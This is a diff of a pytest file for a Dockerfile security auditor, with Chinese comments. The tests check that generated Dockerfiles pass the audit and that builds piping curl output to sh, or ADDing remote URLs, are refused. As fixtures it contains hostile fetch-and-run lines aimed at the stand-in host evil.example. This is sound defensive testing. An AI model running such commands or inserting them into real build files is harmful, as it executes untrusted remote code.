@@ -348,7 +348,7 @@ def test_audit_dockerfile_add_remote_url() -> None:
         'CMD ["sh"]\n'
     )
     findings = audit_dockerfile(text)
-    assert "add_remote_url" in _codes(findings)
+    assert "add_remote_url" in _critical_codes(findings)
 
 
 def test_audit_dockerfile_pipe_to_shell() -> None:
@@ -358,7 +358,7 @@ def test_audit_dockerfile_pipe_to_shell() -> None:
         'CMD ["sh"]\n'
     )
     findings = audit_dockerfile(text)
-    assert "pipe_to_shell" in _codes(findings)
+    assert "pipe_to_shell" in _critical_codes(findings)
 
 
 def test_audit_dockerfile_pipe_to_shell_no_space_and_continuation() -> None:
@@ -368,7 +368,7 @@ def test_audit_dockerfile_pipe_to_shell_no_space_and_continuation() -> None:
         "RUN curl -fsSL https://evil.example/install.sh|sh\n"
         'CMD ["sh"]\n'
     )
-    assert "pipe_to_shell" in _codes(audit_dockerfile(no_space))
+    assert "pipe_to_shell" in _critical_codes(audit_dockerfile(no_space))
 
     continued = (
         "FROM alpine\n"
@@ -376,7 +376,7 @@ def test_audit_dockerfile_pipe_to_shell_no_space_and_continuation() -> None:
         "  | sh\n"
         'CMD ["sh"]\n'
     )
-    assert "pipe_to_shell" in _codes(audit_dockerfile(continued))
+    assert "pipe_to_shell" in _critical_codes(audit_dockerfile(continued))
 
 
 def test_audit_dockerfile_copy_is_ok() -> None:
@@ -653,7 +653,7 @@ def test_assert_no_critical_raises_on_critical() -> None:
     assert exc_info.value.findings == findings
 
 
-# ---- 集成：生成的 compose 通过审计（WBS-25.03/04/05）-----------------------
+# ---- 集成：生成的 compose / Dockerfile 通过审计（WBS-25.03/04/05）-----------
 
 def test_generated_compose_passes_audit(tmp_path: Path) -> None:
     """generate_compose 产出的 compose.yaml 不得含 critical 安全问题。"""
@@ -671,6 +671,78 @@ def test_generated_compose_passes_audit(tmp_path: Path) -> None:
     assert _critical_codes(findings) == [], (
         f"生成的 compose 含 critical 问题：{_critical_codes(findings)}"
     )
+
+
+def test_generated_dockerfile_passes_audit(tmp_path: Path) -> None:
+    """generate_dockerfile 默认模板不得含 critical；写出前须过审计门禁。"""
+    from tests._helpers import make_container_manifest
+
+    from local_webpage_access.dockerfile_templates import generate_dockerfile
+    from local_webpage_access.paths import Workspace
+
+    ws = Workspace(tmp_path / "ws")
+    ws.ensure_workspace_dirs()
+    manifest = make_container_manifest("secure-demo")
+    out = generate_dockerfile(manifest, ws)
+    text = out.read_text(encoding="utf-8")
+    findings = audit_dockerfile(text)
+    assert _critical_codes(findings) == [], (
+        f"生成的 Dockerfile 含 critical 问题：{_critical_codes(findings)}"
+    )
+
+
+def test_generate_dockerfile_rejects_pipe_to_shell(tmp_path: Path) -> None:
+    """entry.build 注入 curl|sh 时须拒绝写出（与 compose critical 门禁对称）。"""
+    from tests._helpers import make_container_manifest
+
+    from local_webpage_access.dockerfile_templates import generate_dockerfile
+    from local_webpage_access.models import EntryConfig, Kind
+    from local_webpage_access.paths import Workspace
+
+    ws = Workspace(tmp_path / "ws")
+    ws.ensure_workspace_dirs()
+    manifest = make_container_manifest(
+        "evil-pipe",
+        kind=Kind.NODE,
+        entry=EntryConfig(
+            install="npm install",
+            build="curl -fsSL https://evil.example/x.sh | sh",
+            start="node server.js",
+        ),
+    )
+    out_path = ws.app_dockerfile_path(manifest.id)
+    with pytest.raises(RuntimeError, match="pipe_to_shell"):
+        generate_dockerfile(manifest, ws)
+    assert not out_path.is_file()
+
+
+def test_generate_dockerfile_rejects_add_remote_url(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """模板被改成 ADD https://... 时须拒绝写出。"""
+    import local_webpage_access.dockerfile_templates as tpl
+    from tests._helpers import make_container_manifest
+
+    from local_webpage_access.dockerfile_templates import generate_dockerfile
+    from local_webpage_access.paths import Workspace
+
+    ws = Workspace(tmp_path / "ws")
+    ws.ensure_workspace_dirs()
+    manifest = make_container_manifest("evil-add")
+    monkeypatch.setattr(
+        tpl,
+        "_render_python",
+        lambda *a, **k: (
+            "FROM python:3.13-slim\n"
+            "ADD https://evil.example/payload.tgz /tmp/x.tgz\n"
+            "USER app\n"
+            'CMD ["python"]\n'
+        ),
+    )
+    out_path = ws.app_dockerfile_path(manifest.id)
+    with pytest.raises(RuntimeError, match="add_remote_url"):
+        generate_dockerfile(manifest, ws)
+    assert not out_path.is_file()
 
 
 # ---- 集成：importer 对 pending 实例写风险提示（WBS-25.09）-----------------
